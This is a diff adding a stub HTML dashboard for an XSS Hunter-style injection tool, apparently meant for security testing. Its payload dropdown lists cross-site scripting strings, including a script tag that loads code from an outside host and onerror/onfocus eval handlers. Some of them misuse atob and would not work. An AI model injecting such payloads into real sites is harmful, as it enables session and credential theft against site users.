@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Hunter</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/xsshunter.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1 class="mt-4">XSS Hunter Dashboard</h1>
+        
+        <div class="alert alert-info mt-3" role="alert">
+            <strong>Info:</strong> This is a basic XSS Hunter setup.
+        </div>
+
+        <div class="row">
+            <div class="col-md-6">
+                <h2>Injection Rules</h2>
+                <ul id="rules-list" class="list-group">
+                    <li class="list-group-item">No rules set!</li>
+                </ul>
+            </div>
+
+            <div class="col-md-6">
+                <h2>Manage Injection Rules</h2>
+                <form id="rule-form">
+                    <div class="form-group">
+                        <label for="target-string">Target String (Regex):</label>
+                        <input type="text" class="form-control" id="target-string" placeholder="example.*replacement" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="replace-in">Replace Target String in:</label>
+                        <select id="replace-in" class="form-control" multiple>
+                            <option value="entire">Entire Request</option>
+                            <option value="header">Header</option>
+                            <option value="body">Body</option>
+                            <option value="first_line">First Line</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="payload">Replace With Payload:</label>
+                        <select id="payload" class="form-control">
+                            <option value="generic_script_tag_payload">&lt;script src="https://example.xss.ht"&gt;&lt;/script&gt;</option>
+                            <option value="javascript_uri_payload">javascript:eval('alert(1)')</option>
+                            <option value="input_tag_payload">&lt;input onfocus=eval(atob('alert(1)')) autofocus&gt;</option>
+                            <option value="img_tag_payload">&lt;img src="payload" onerror=eval(atob('alert(1)'))&gt;</option>
+                            <option value="source_tag_payload">&lt;video src="payload" controls&gt;&lt;/video&gt;</option>
+                            <option value="srcdoc_tag_payload">&lt;iframe srcdoc="payload"&gt;&lt;/iframe&gt;</option>
+                            <option value="xhr_payload">&lt;script&gt;eval('alert(1)')&lt;/script&gt;</option>
+                            <option value="custom_javascript">Custom JavaScript Manipulation</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group" id="custom-javascript-container" style="display:none;">
+                        <label for="custom-javascript">Custom JavaScript:</label>
+                        <textarea id="custom-javascript" class="form-control" rows="5"></textarea>
+                    </div>
+                    
+                    <input type="hidden" id="rule-id">
+                    <button type="submit" class="btn btn-primary">Add Rule</button>
+                    <button type="button" class="btn btn-secondary" id="update-rule-button" style="display:none;">Update Rule</button>
+                    <button type="button" class="btn btn-danger" id="delete-rule-button" style="display:none;">Delete Rule</button>
+                    <button type="button" class="btn btn-secondary" id="cancel-button">Cancel</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            $('#payload').change(function () {
+                if ($(this).val() === 'custom_javascript') {
+                    $('#custom-javascript-container').show();
+                } else {
+                    $('#custom-javascript-container').hide();
+                }
+            });
+
+            $('#rule-form').submit(function (e) {
+                e.preventDefault();
+                // Add rule handling code here
+            });
+
+            $('#cancel-button').click(function () {
+                // Reset form or handle cancel action
+            });
+
+            $('#update-rule-button').click(function () {
+                // Handle update rule action
+            });
+
+            $('#delete-rule-button').click(function () {
+                // Handle delete rule action
+            });
+        });
+    </script>
+</body>
+</html>
